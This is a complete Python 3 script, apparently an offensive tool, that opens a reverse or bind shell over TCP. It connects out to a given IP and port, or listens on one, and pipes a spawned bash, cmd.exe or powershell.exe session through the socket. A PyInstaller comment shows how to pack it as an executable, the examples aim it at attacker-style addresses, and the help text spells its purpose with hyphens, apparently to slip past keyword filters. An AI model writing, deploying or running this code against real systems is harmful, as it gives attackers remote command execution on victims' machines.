#!/usr/bin/python3
import argparse,os,socket,sys
import threading as trd
import subprocess as sb
from argparse import RawTextHelpFormatter

# pyinstaller -F rev-bind-tcp.py

examples = '''Examples:
    ./rev-bind-tcp.py -i 10.10.12.69 -p 9001 -o /bin/bash
    ./rev-bind-tcp.exe -i 172.168.20.12 -o powershell.exe
    ./rev-bind-tcp.exe -i 0.0.0.0 -m bind -o cmd.exe'''

opts = argparse.ArgumentParser(description='Python3 get a shell script that works as a (r-e-v) or (b-i-n-d s-h-e-l-l)',formatter_class=RawTextHelpFormatter,epilog=examples)

opts.add_argument("-i","--ip", required=False,type=str,default='127.0.0.1',help='Default Ip is: 127.0.0.1')
opts.add_argument("-p","--port", required=False,type=int,default=1234,help='Default Port is: 1234')
opts.add_argument("-o","--option", required=False,type=str,default='/bin/bash',help='Pick desired shell. Default shell option is /bin/sh\n-o <any-shell-option>\n-o cmd.exe\n-o bash')
opts.add_argument("-m","--method", required=False,type=str,default='rev',help='Bind or Rev shell method. Default method is: rev\n-m rev || rev-shell\n-m bind || bind-shell')

args = opts.parse_args()

def sock2proc(s, p):
    while True:
        p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
def proc2sock(s, p):
    while True:
        s.send(p.stdout.read(1).encode())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if args.method == 'rev':
    while True:
        try:
       		s.connect((args.ip,args.port))
        	break
        except:
        	pass

    p = sb.Popen([args.option], stdout=sb.PIPE, stderr=sb.STDOUT, stdin=sb.PIPE, shell=True, text=True)
    trd.Thread(target=sock2proc, args=[s, p], daemon=True).start()
    trd.Thread(target=proc2sock, args=[s, p], daemon=True).start()
    try:
    	p.wait()
    except:
        s.close()
        sys.exit(0)

elif args.method == 'bind':
    s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    s.bind((args.ip,args.port))
    s.listen(1);c,a=s.accept()
    while True:
        d=c.recv(1024).decode();
        p = sb.Popen(d,shell=True,stdout=sb.PIPE,stderr=sb.PIPE,stdin=sb.PIPE)
        c.sendall(p.stdout.read()+p.stderr.read())
else:
    print("\nSorry.\nInvalid Method Selected...")
    s.close()
    sys.exit(0)
